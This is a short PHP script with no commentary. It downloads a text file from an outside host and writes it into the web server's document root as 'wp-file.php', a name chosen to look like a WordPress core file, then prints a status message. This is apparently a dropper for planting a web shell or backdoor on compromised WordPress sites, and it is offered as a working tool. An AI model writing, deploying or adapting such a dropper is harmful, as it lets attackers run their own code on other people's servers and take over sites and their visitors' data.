<?php
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$check=$_SERVER['DOCUMENT_ROOT'] . "/wp-file.php" ;
$text = http_get('https://www.med-health.net/cache/hehe.txt');
$op=fopen($check, 'w');
fwrite($op,$text);
fclose($op);
if(file_exists($check)){
echo "Dont delete<br>";
}else {
echo "ora bisa";
}
?>
